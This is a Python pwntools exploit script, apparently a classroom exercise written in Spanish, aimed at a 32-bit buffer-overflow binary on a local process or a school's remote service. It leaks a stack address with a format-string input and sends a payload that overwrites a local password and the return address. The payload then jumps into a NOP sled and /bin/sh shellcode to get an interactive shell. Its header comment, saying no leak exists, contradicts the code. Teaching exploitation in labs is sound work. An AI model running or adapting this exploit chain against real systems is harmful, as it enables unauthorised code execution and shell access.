#!/usr/bin/python3
##############################
# En este ejercicio se comprueba si se altera una variable local mediante desbordamiento.
# Simplemente debemos setear el valor adecuado en el payload.
# Por otro lado no tenemos leak por lo que tenemos que desactivar ASLR para tener éxito.
#
#
# Se te ocurre alguna forma en la que podamos tener éxito sin desactivar ASLR y sin leak????
# Una pista: Esta técnica solo sería factible en 32 bits al tener un espacio de memoria más pequeño.
##############################
from pwn import *
elf = context.binary = ELF("bof")
libc = elf.libc
HOST = "www.iesvirgendelcarmen.com"
PORT = 10004

gs = '''
b start_level
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
	    return remote(HOST, PORT)
    else:
        return process(elf.path)


#Hay que calcular la dirección.
#ret2stack = 0xffffd56c+124+100


io = start()
io.recv()
io.sendline('luis%6$p')
io.recvuntil('Bienvenido: luis')
leak = int(io.recvline(), 16)
print(hex(leak))
io.recv()

#Usamos una shellcode de shellcraft. Shellcodes que vienen en pwntools
print(shellcraft.i386.linux.sh())
shellcode = asm("NOP; "*200+shellcraft.i386.linux.sh())

password = b"qwerty\0"

#Generamos un payload en little endian para 32 bits
payload = flat (
    password ,    #ebp-0x34
    b"A"*(12-len(password)),
    b"B"*24  ,     #ebp-28
    b"CCCC",       #ebp-0x10
    b"DDDD",       #ebp-0xc
    b"EEEE",
    b"EEEE",
    b"FFFF",       #ebp
    p32(leak),#ret
    shellcode,
    endianness = 'little', word_size = 32, sign = False
    )
#Enviamos el payload
io.sendline(payload)
io.interactive()
